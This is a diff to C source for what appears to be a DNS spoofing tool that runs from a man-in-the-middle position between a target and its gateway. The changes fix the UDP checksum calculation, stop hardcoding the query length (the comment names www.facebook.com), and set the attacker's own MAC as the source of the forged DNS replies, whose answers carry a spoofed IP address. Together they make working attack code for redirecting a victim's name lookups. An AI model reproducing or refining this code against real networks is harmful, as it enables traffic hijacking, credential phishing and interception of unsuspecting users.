@@ -62,32 +62,45 @@ uint16_t udp_checksum( uint16_t* buf, size_t len, uint16_t* saddr, uint16_t* dad
         size_t length = len;
         int i=0;
 
+
+
+        // Add the pseudo-header                                        
+        sum += *(saddr);
+        sum += *(saddr+1);
+        sum += *(daddr);
+        sum += *(daddr+1);
+        sum += htons(0x0011); //UDP PROTOCOL
+        sum += htons(length);
+
         // Calculate the sum                                            
         while (len > 1){
-                sum += htons((*(buf+i)));
+            //fprintf(stderr, "%.8x + %.8x = ", ntohs(sum),ntohs(*(buf+i)) );
+                sum += (*(buf+i));
+            //fprintf(stderr, "%.8x", ntohs(sum) );
                 if (sum & 0x80000000)
                         sum = (sum & 0xFFFF) + (sum >> 16);
                 len -= 2;
+                //fprintf(stderr, "\t\t\t\tlen = %ld\n", len );
                 i++;
         }
-        if (len&1)
-            // Add the padding if the packet lenght is odd          
-            sum += *((uint8_t *)buf);
- 
-        // Add the pseudo-header                                        
-        sum += htons(*(saddr));
-        sum += htons(*(saddr+1));
-        sum += htons(*(daddr));
-        sum += htons(*(daddr+1));
-        sum += 0x0011; //UDP PROTOCOL
-        sum += length;
+        if (len&1){
+            // Add the padding if the packet lenght is odd 
+            //fprintf(stderr, "%.8x + %.8x = ", ntohs(sum),ntohs(*(buf+i)) );         
+            sum += *((uint8_t *)(buf+i));
+            //fprintf(stderr, "%.8x (odd)", ntohs(sum) );
+            //fprintf(stderr, "\t\t\t\tlen = %ld\n", len );
+        }
+
+
 
         // Add the carries                                              
         while (sum >> 16)
             sum = (sum & 0xFFFF) + (sum >> 16);
-        // Return the one's complement of sum                           
-        return ( htons((uint16_t)(~sum))  );
+        // Return the one's complement of sum
+        //fprintf(stderr, "cks = %.8x  | 1': %.8x\n", ntohs((uint16_t)(sum)), htons((uint16_t)(~sum)));                        
+        return ( ((uint16_t)(~sum))  );
 }
+
 
 uint16_t ip_cksum (const void *_data, int len) {
   const uint8_t *data = _data;
@@ -192,16 +205,9 @@ uint8_t* construct_dns_response(uint8_t* ether_shost, uint8_t* ether_dhost, //l2
     for(i=0;i< 4;i++)
         *(dns_answer->data+i) = *(ip_spoof+i);
 
-    //fprintf(stderr, "UDP Len: %d byte\n", ntohs(udp_hdr->len));
 
     uint32_t src_addr = ip_hdr->saddr[0]<<24 | ip_hdr->saddr[1]<<16 | ip_hdr->saddr[2]<<8 | ip_hdr->saddr[3];
     uint32_t dst_addr = ip_hdr->daddr[0]<<24 | ip_hdr->daddr[1]<<16 | ip_hdr->daddr[2]<<8 | ip_hdr->daddr[3];
-
-
-
-
-
-    //fprintf(stderr, "IP Len: %d byte\n", ntohs(ip_hdr->tot_len));
 
 
 
@@ -211,14 +217,18 @@ uint8_t* construct_dns_response(uint8_t* ether_shost, uint8_t* ether_dhost, //l2
     memcpy(dns_pac + sizeof(struct ether_header), ip_hdr, sizeof(struct iphdr));
     memcpy(dns_pac + sizeof(struct ether_header) + sizeof(struct iphdr), udp_hdr, sizeof(struct udphdr));
     memcpy(dns_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr), dns_hdr, sizeof(struct dnshdr));
-    memcpy(dns_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr), query_data, 22); //www.facebook.com type A class IN
-    memcpy(dns_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + 22, dns_answer, sizeof(struct dnsanswer));
+    memcpy(dns_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr), query_data, query_data_len); //www.facebook.com type A class IN
+    memcpy(dns_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + query_data_len, dns_answer, sizeof(struct dnsanswer));
 
     uint16_t* udp_pac = (uint16_t*) (dns_pac + sizeof(struct ether_header) + sizeof(struct iphdr));
     struct udphdr* udp_hdr_t = (struct udphdr*) (dns_pac + sizeof(struct ether_header) + sizeof(struct iphdr));
-
+    /*
+    fprintf(stderr, "udp packet (len = %d)\n", ntohs(udp_hdr->uh_ulen));
+    for(i = 0;i< ntohs(udp_hdr->uh_ulen); i++)
+        fprintf(stderr, "%.2x ", *((uint8_t*)udp_pac+i));
+    fprintf(stderr, "\n");
+    */
     udp_hdr_t->uh_sum = udp_checksum( udp_pac, ntohs(udp_hdr->uh_ulen), (uint16_t*) (ip_hdr->saddr), (uint16_t*) (ip_hdr->daddr));
-
  
     return dns_pac;
 }
@@ -271,7 +281,7 @@ void* target_to_gateway(void* args){
                         dns_pac_status(ip_pac, qname_str, dns_query.qtype, dns_query.qclass);
 
                         int dns_res_len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + qname_len + 4 + sizeof(struct dnsanswer);
-                        uint8_t* dns_res = construct_dns_response(argument->gateway_mac, argument->target_mac,
+                        uint8_t* dns_res = construct_dns_response(argument->my_mac, argument->target_mac,
                         ip_hdr->id, ip_hdr->protocol, ip_hdr->daddr, ip_hdr->saddr, 
                         udp_hdr->uh_sport, dns_hdr->tid,
                         query_data, qname_len+4,
